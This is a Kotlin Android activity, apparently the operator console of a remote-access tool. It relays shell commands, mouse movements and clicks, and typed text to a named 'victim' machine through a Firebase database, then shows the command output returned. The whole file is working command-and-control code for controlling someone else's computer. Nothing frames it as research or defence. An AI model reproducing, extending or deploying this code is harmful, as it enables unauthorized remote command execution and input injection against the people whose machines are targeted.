package com.nasa.wrcp
import android.animation.ObjectAnimator
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.nasa.wrcp.R
import android.content.Context
import android.content.Intent
import android.os.Build
import android.text.method.ScrollingMovementMethod
import android.util.Log
import android.widget.*
import androidx.annotation.RequiresApi
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.google.android.material.snackbar.Snackbar
import com.google.firebase.database.*
import java.time.LocalDateTime

class AttackVictim : AppCompatActivity(R.layout.activity_attackvictim) {

    private var isFabOpen = false

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        FirebaseApp.initializeApp(this)
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_attackvictim)
        val mf = MyFuctions()
        val intent = intent

        val dbRef: DatabaseReference = FirebaseDatabase
                                                .getInstance()
                                                .reference.child("/${intent.getStringExtra("NAME")}")

        val victimNameTV = findViewById<TextView>(R.id.victimName)
        val victimIPTV = findViewById<TextView>(R.id.victimIP)
        val attackCLI = findViewById<Button>(R.id.attackCLI)
        val inputCLI = findViewById<EditText>(R.id.inputCLI)
        val attackMouse = findViewById<Button>(R.id.attackMouse)
        val isClickCheckBox = findViewById<CheckBox>(R.id.isClick)
        val inputX = findViewById<EditText>(R.id.inputX)
        val inputY = findViewById<EditText>(R.id.inputY)
        val attackWrite = findViewById<Button>(R.id.attackWrite)
        val inputWrite = findViewById<EditText>(R.id.inputWrite)
        val CLIRES = findViewById<TextView>(R.id.CLIRES)
//        val fab = findViewById<FloatingActionButton>(R.id.fab)
        val fabMain = findViewById<FloatingActionButton>(R.id.fab_main)
        val fabCapture = findViewById<FloatingActionButton>(R.id.fab_capture)
        val fabChatting = findViewById<FloatingActionButton>(R.id.fab_share)
//
        CLIRES.movementMethod = ScrollingMovementMethod.getInstance()

        var NAME = ""
        var IP = ""
        if (intent.hasExtra("NAME")) {
            NAME = intent.getStringExtra("NAME").toString()
            victimNameTV.text = NAME
        }
        if (intent.hasExtra("IP")) {
            IP = intent.getStringExtra("IP").toString()
            victimIPTV.text = IP
        }
        fabMain.setOnClickListener {
            toggleFab()
        }

        fabCapture.setOnClickListener {
        }

        fabChatting.setOnClickListener {
            dbRef.child("CHAT").child("status").setValue("1/openCHAT/${LocalDateTime.now()}")

            val intent2 = Intent(this, Chatting::class.java)
            intent2.putExtra("NAME", NAME)
            Log.e("intent2", intent2.toString())
            startActivity(intent2)
        }

        attackCLI.setOnClickListener{
            val CLI = inputCLI.text.toString()
            dbRef.child("CLI").setValue(CLI + "/CLI/" + LocalDateTime.now())
                .addOnCompleteListener {    task ->
                    if (task .isSuccessful) {
                        mf.showToast(this, "SUCCESS!!")
                    }
                    else {
                        mf.showToast(this, "FAILED!!! SOMETHING ERROR")
                    }
                }
        }

        attackMouse.setOnClickListener {
            val X = inputX.text.toString()
            val Y = inputY.text.toString()
            val isClick: Boolean = isClickCheckBox.isChecked

            dbRef.child("MOUSE")
                .setValue(X + "," + Y + "," + "${isClick}" + "/MOUSE/" + LocalDateTime.now())
                .addOnCompleteListener { task ->
                    if (task .isSuccessful) {
                        mf.showToast(this, "SUCCESS!!")
                    }
                    else {
                        mf.showToast(this, "FAILED!!! SOMETHING ERROR")
                    }
                }
        }

        attackWrite.setOnClickListener {
            val input = inputWrite.text.toString()

            dbRef.child("WRITE")
                .setValue(input + "/WRITE/" + LocalDateTime.now())
                .addOnCompleteListener { task ->
                    if (task .isSuccessful) {
                        mf.showToast(this, "SUCCESS!!")
                    }
                    else {
                        mf.showToast(this, "FAILED!!! SOMETHING ERROR")
                    }
                }
        }

        dbRef.child("RES").addValueEventListener(object : ValueEventListener{
            override fun onDataChange(snapshot: DataSnapshot) {
                val res = snapshot.getValue(String::class.java)
                if (res != null) {
                    CLIRES.text = res
                }
            }

            override fun onCancelled(error: DatabaseError) {
                TODO("Not yet implemented")
            }
        })
    }
    private fun toggleFab() {
        val fabMain = findViewById<FloatingActionButton>(R.id.fab_main)
        val fabCapture = findViewById<FloatingActionButton>(R.id.fab_capture)
        val fabChatting = findViewById<FloatingActionButton>(R.id.fab_share)
        // 플로팅 액션 버튼 닫기 - 열려있는 플로팅 버튼 집어넣는 애니메이션 세팅
        if (isFabOpen) {
            ObjectAnimator.ofFloat(fabCapture, "translationY", 0f).apply { start() }
            ObjectAnimator.ofFloat(fabChatting, "translationY", 0f).apply { start() }

            // 플로팅 액션 버튼 열기 - 닫혀있는 플로팅 버튼 꺼내는 애니메이션 세팅
        } else {
            ObjectAnimator.ofFloat(fabCapture, "translationY", -200f).apply { start() }
            ObjectAnimator.ofFloat(fabChatting, "translationY", -400f).apply { start() }
        }

        isFabOpen = !isFabOpen

    }

}